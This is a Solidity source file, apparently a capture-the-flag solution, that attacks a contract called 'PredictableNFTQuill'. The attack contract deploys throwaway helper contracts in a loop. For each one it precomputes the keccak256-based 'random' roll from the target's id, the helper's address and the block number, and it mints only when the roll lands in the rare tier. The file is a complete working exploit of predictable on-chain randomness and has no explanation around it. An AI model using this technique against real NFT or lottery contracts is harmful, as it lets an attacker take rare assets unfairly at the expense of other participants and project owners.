// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./PredictableNFT.sol";

contract PredictableNFTQuillHelper {
    PredictableNFTQuill n;
    constructor(address target) {
        n = PredictableNFTQuill(target);
    }
    function mint() public payable {
        n.mint{value: 1 ether}();
    }
}

contract PredictableNFTQuillAttack {
    
    function attack(address target) public payable {
        PredictableNFTQuill n = PredictableNFTQuill(target);
        while (true) {
            PredictableNFTQuillHelper h = new PredictableNFTQuillHelper(target);
            uint256 value = uint256(keccak256(abi.encode(n.id(), address(h), block.number))) % 100;
            if (value > 90) {
                h.mint{value: 1 ether}();
                break;
            }
        }
        
    }
    receive() external payable {}
}


